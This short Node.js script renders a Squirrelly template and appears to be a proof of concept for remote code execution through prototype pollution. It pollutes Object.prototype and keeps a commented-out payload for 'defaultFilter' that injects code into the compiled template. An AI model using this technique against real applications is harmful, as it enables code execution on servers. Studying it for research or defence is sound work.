var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'complex.sqrl');

// source: express: app.render: merge
// Object.prototype.defaultFilter = "e')); console.log('RCE')//";
Object.prototype.settings = {};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });